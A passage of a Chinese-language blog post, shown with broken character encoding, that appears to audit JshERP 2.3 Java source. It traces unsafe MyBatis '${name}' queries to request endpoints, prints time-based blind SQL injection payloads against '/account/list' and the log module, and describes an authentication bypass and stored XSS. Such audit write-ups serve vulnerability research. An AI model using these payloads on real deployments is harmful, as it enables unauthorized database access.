<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯»æ‰¾è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">getAccountList() çš„ä½ç½®</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿› select</p>
<p> <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map&lt;String, String&gt; parameterMap) æ˜¯</font>æ•´ä¸ªæŸ¥è¯¢æ¨¡å—çš„ç»Ÿä¸€å…¥å£  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png" srcset="/img/loading.gif" lazyload></p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥ä¸‹æ¥å»æ‰¾å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œå¯ä»¥å‘ç°ï¼Œåœ¨â€œåŸºæœ¬èµ„æ–™â€ä¸­éƒ½æ˜¯æŸ¥è¯¢æ¥å£ï¼Œè€Œç°åœ¨æˆ‘ä»¬éœ€è¦çš„æ˜¯â€œç»“ç®—è´¦æˆ·â€çš„æŸ¥è¯¢æ¥å£ï¼Œå…¶ä»–çš„æ¥å£ä¹Ÿåº”è¯¥å­˜åœ¨sqlæ³¨å…¥ï¼Œä¹‹åæŸ¥çœ‹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯¹â€œç»“ç®—è´¦æˆ·â€çš„æŸ¥è¯¢ç‚¹æŠ“åŒ…åï¼Œæ­£å¥½å¯¹åº”åˆšæ‰æºç ä¸­çœ‹åˆ°çš„å‡ ä¸ªå‚æ•°â€œ<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>â€ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯¹ name å‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼š</p>
<p>ä»ç»“æœæ¥çœ‹æ—¶é—´ç›²æ³¨æˆåŠŸäº†</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br>Host: 169.254.252.28:8123<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://169.254.252.28:8123/pages/manage/account.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817<br>Connection: close<br><br>GET /account/list?search=&#123;&quot;name&quot;:&quot;123&#x27; or sleep(5)--+&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;&#125;&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br><br>payloadï¼š<br>GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨Mybatisçš„æ—¥å¿—ä¸­ï¼Œ å¯ä»¥æ¸…æ¥šçœ‹åˆ° SQL æ³¨å…¥ç‚¹å·²ç»è¢«åˆ©ç”¨ï¼Œå¹¶ä¸” <strong>æ—¶é—´ç›²æ³¨ç”Ÿæ•ˆ</strong>ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="DepotMapperEx-xml"><a href="#DepotMapperEx-xml" class="headerlink" title="DepotMapperEx.xml"></a>DepotMapperEx.xml</h3><p>é€šè¿‡ä¸Šè¿°AccoutMapperEx.xmlçš„å®¡è®¡ï¼Œå¯ä»¥ç¡®å®šè¯¥ç³»ç»Ÿä¸­æœ‰å¤šä¸ªç±»ä¼¼çš„sqlæ³¨å…¥ç‚¹ï¼Œä»–ä»¬çš„æµç¨‹éƒ½æ˜¯ä¸€è‡´çš„ã€‚</p>
<p>å†ä»¥DepotMapperEx.xml ä¸ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;select id=&quot;selectByConditionDepot&quot; parameterType=&quot;com.jsh.erp.datasource.entities.DepotExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;<br>  select dep.*,usr.username as principalName<br>  FROM jsh_depot dep<br>  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)<br>  where 1=1<br>  &lt;if test=&quot;name != null&quot;&gt;<br>    and dep.name like &#x27;%$&#123;name&#125;%&#x27;<br>  &lt;/if&gt;<br><br>-&gt;selectByConditionDepot<br>public interface DepotMapperEx &#123;<br><br>    List&lt;DepotEx&gt; selectByConditionDepot(<br>            @Param(&quot;name&quot;) String name,<br>            @Param(&quot;type&quot;) Integer type,<br>            @Param(&quot;remark&quot;) String remark,<br>            @Param(&quot;offset&quot;) Integer offset,<br>            @Param(&quot;rows&quot;) Integer rows);<br><br>-&gt;DepotService<br>public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception &#123;<br>        List&lt;DepotEx&gt; list=null;<br>        try&#123;<br>            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);<br>        &#125;catch(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        return list;<br>    &#125;<br><br>-&gt;select<br>@Override<br>    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception &#123;<br>        return getDepotList(map);<br>    &#125;<br><br>    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception &#123;<br>        String search = map.get(Constants.SEARCH);<br>        String name = StringUtil.getInfo(search, &quot;name&quot;);<br>        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &quot;type&quot;));<br>        String remark = StringUtil.getInfo(search, &quot;remark&quot;);<br>        String order = QueryUtils.order(map);<br>        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br><br>-&gt;select<br> /**<br>     * æŸ¥è¯¢<br>     * @param apiName<br>     * @param parameterMap<br>     * @return<br>     */<br>    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;<br>        if (StringUtil.isNotEmpty(apiName)) &#123;<br>            return container.getCommonQuery(apiName).select(parameterMap);<br>        &#125;<br>        return new ArrayList&lt;Object&gt;();<br>    &#125;<br><br>-&gt;select<br>@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)<br>    public String getList(@PathVariable(&quot;apiName&quot;) String apiName,<br>                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,<br>                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,<br>                        @RequestParam(value = Constants.SEARCH, required = false) String search,<br>                        HttpServletRequest request)throws Exception &#123;<br>        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>        parameterMap.put(Constants.SEARCH, search);<br>        PageQueryInfo queryInfo = new PageQueryInfo();<br>        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();<br>        if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;<br>            pageSize = 10;<br>        &#125;<br>        String offset = ParamUtils.getPageOffset(currentPage, pageSize);<br>        if (StringUtil.isNotEmpty(offset)) &#123;<br>            parameterMap.put(Constants.OFFSET, offset);<br>        &#125;<br>        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br>        objectMap.put(&quot;page&quot;, queryInfo);<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h3><p>é€šè¿‡å…¨å±€æœç´¢åˆ°<code>like &#39;%${name}%&#39;</code>ï¼Œå®šä½ <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>ï¼Œä¹‹åä¾¿åœ¨ <code>controller</code> å’Œ <code>service</code> ä¸­æ‰¾å¯¹åº”çš„æ–‡ä»¶åï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°  <code>selectByConditionXxxxx</code> (åŸºæœ¬ä¸Šéƒ½åœ¨serviceä¸­)ï¼Œæ‰¾åˆ°ä¹‹åä¼šå‘ç° <code>selectByConditionXxxxx</code> ä¸­æ‰€éœ€çš„å‡ ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯æ¥è‡ª <code>select</code> æŸ¥è¯¢ï¼Œè·Ÿè¿› <code>select</code> ï¼Œæ‰¾åˆ° <code>getXxxList</code> æ–¹æ³•è§£æ <code>select(Map&lt;String,String&gt; map)</code> ä¼ å…¥çš„å‰ç«¯è¯·æ±‚å‚æ•°ï¼Œè·Ÿè¿› <code>select</code>ï¼Œå‘ç°ä»–æ˜¯ç»Ÿä¸€æ¥å£ï¼Œé€šè¿‡ <code>apiName</code> åŠ¨æ€è°ƒç”¨ä¸åŒæŸ¥è¯¢ã€‚æ¥ä¸‹æ¥å°±åœ¨å‰ç«¯æ‰¾å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œåœ¨â€åŸºæœ¬èµ„æ–™â€œé‡Œå¯ä»¥çœ‹åˆ°æœ‰æŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡æŠ“åŒ…æˆ–è€…å¯¹åº”åç§°æ¥ç¡®å®šéœ€è¦çš„æ¥å£ï¼Œä¾‹å¦‚ï¼š<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>ï¼Œ<code>nameã€serialNoã€remark</code> éƒ½æ˜¯å¯¹åº”çš„ <code>AccoutMapperEx</code> çš„å‚æ•°ï¼Œé‚£ä¹ˆå°±åœ¨ <code>name</code> å‚æ•°æ³¨å…¥ã€‚</p>
<p>åŒæ ·çš„æ¼æ´æœ‰ï¼š</p>
<ul>
<li>AccoutMapperEx.xml	</li>
<li>DepotMapperEx.xml </li>
<li>LogMapperEx.xml ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œæ—¥å¿—ç®¡ç†â€ï¼‰<ul>
<li>payload : 111â€™ OR SLEEP(5) OR â€˜1â€™&#x3D;â€™1</li>
</ul>
</li>
<li><font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xml	ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œå•†å“ç®¡ç†â€-â€œå•†å“ä¿¡æ¯â€ï¼‰</font></li>
<li><font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xml	ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œåŸºæœ¬èµ„æ–™â€-â€œç»æ‰‹äººç®¡ç†â€ï¼‰</font></li>
<li><font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xml	ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œè§’è‰²ç®¡ç†â€ï¼‰</font></li>
<li><font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xml	ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œå•†å“ç®¡ç†â€-â€œè®¡é‡å•ä½â€ï¼‰</font></li>
<li><font style="color:#080808;background-color:#ffffff;">UserMapperEx.xml	ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œç”¨æˆ·ç®¡ç†â€ï¼‰</font></li>
</ul>
<h2 id="4ã€èº«ä»½éªŒè¯-é‰´æƒ"><a href="#4ã€èº«ä»½éªŒè¯-é‰´æƒ" class="headerlink" title="4ã€èº«ä»½éªŒè¯&amp;é‰´æƒ"></a>4ã€èº«ä»½éªŒè¯&amp;é‰´æƒ</h2><p>è¿™ä¸€éƒ¨åˆ†ä¾æ—§æ˜¯ LogCostFilter.java å‘ç°çš„æ¼æ´ç‚¹ï¼Œåœ¨SQL æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬ç™»å½•åˆ°åå°è¿›è¡Œçš„æ³¨å…¥ï¼Œé‚£ä¹ˆç»“åˆé‰´æƒæ¼æ´ï¼Œå°±å¯ä»¥æœªç™»å½•è¿›è¡ŒSQLæ³¨å…¥ã€‚</p>
<p>ä»å›¾ç‰‡çœ‹åˆ°ï¼Œç»•è¿‡èº«ä»½éªŒè¯ä¹Ÿå¯ä»¥è¿›è¡ŒSQLæ³¨å…¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h1><h2 id="1ã€å­˜å‚¨å‹XSS"><a href="#1ã€å­˜å‚¨å‹XSS" class="headerlink" title="1ã€å­˜å‚¨å‹XSS"></a>1ã€<font style="color:rgb(31, 45, 61);">å­˜å‚¨å‹XSS</font></h2><p>å¾ˆå¤šåŠŸèƒ½ç‚¹éƒ½å­˜åœ¨æ­¤æ¼æ´ï¼Œä»¥ä¸‹ä¸¾ä¸‰ä¾‹ï¼š</p>
<h3 id="1-1-ç”¨æˆ·ç®¡ç†"><a href="#1-1-ç”¨æˆ·ç®¡ç†" class="headerlink" title="1.1 ç”¨æˆ·ç®¡ç†"></a>1.1 ç”¨æˆ·ç®¡ç†</h3><p>å…ˆæ–°å¢ä¸€ä¸ªç”¨æˆ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¿®æ”¹ç”¨æˆ·å</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png" srcset="/img/loading.gif" lazyload></p>
<p>å‡ºç°å¼¹çª—</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰¾åˆ°æºç ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥æ”¶å‰ç«¯ä¼ å…¥çš„ info å‚æ•°ï¼Œæ£€æŸ¥ç”¨æˆ·æ•°é‡æ˜¯å¦è¶…é™ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼Œè¿™é‡Œå°±æ˜¯XSS çš„å…¥å£ç‚¹</p>
<h3 id="1-2-å•†å“ä¿¡æ¯"><a href="#1-2-å•†å“ä¿¡æ¯" class="headerlink" title="1.2 å•†å“ä¿¡æ¯"></a>1.2 å•†å“ä¿¡æ¯</h3><p>å¢åŠ å•†å“ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png" srcset="/img/loading.gif" lazyload></p>
<p>äº”ä¸ªåœ°æ–¹éƒ½ä¼šå¼¹çª—</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="1-3-æ”¶å…¥å•"><a href="#1-3-æ”¶å…¥å•" class="headerlink" title="1.3 æ”¶å…¥å•"></a>1.3 æ”¶å…¥å•</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p><font style="color:rgb(34, 34, 38);">é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³•ï¼ˆ</font>java.net.Inet4Addressã€Inet6Addressã€InetSocketAddressï¼Œurlï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatisäºŒçº§ç¼“å­˜ååºåˆ—åŒ–çš„åˆ†æä¸å¤ç°</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">MyBatisè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2020-26945</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">Java ä»£ç å®¡è®¡ä¹‹åå¤ ERP CMS v2.3</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/347135.html"><font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font></a></p>
<p>ã€Javaä»£ç å®¡è®¡ã€‘åå¤-ERPv2.3</p>
<p><a target="_blank" rel="noopener" href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font></a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java/" class="category-chain-item">Java</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java ä»£ç å®¡è®¡</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>åå¤ERP 2.3 ä»£ç å®¡è®¡</div>
      <div>http://xvshifu.github.io/2025/08/20/JshERP-2.3 ä»£ç å®¡è®¡/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´8æœˆ20æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java ååºåˆ—åŒ–å­¦ä¹ ">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java ååºåˆ—åŒ–å­¦ä¹ </span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/14/SpringBoot/" title="SpringBoot">
                        <span class="hidden-mobile">SpringBoot</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- è®¡æ—¶å™¨ -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    ğŸš€ å·²è¿è¡Œï¼š
    <span id="timeDate">è½½å…¥å¤©æ•°...</span>
    <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " å¤©";
          document.getElementById("times").innerHTML = hours + " æ—¶ " + minutes + " åˆ† " + seconds + " ç§’";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- è‡ªå®šä¹‰å†…å®¹ -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
      â¤ï¸  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV ç»Ÿè®¡ï¼ˆBusuanziï¼‰ -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      ğŸ‘â€ğŸ—¨ æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_page_pv">è½½å…¥ä¸­...</span>  
      ğŸ§‘ æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv">è½½å…¥ä¸­...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>


  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
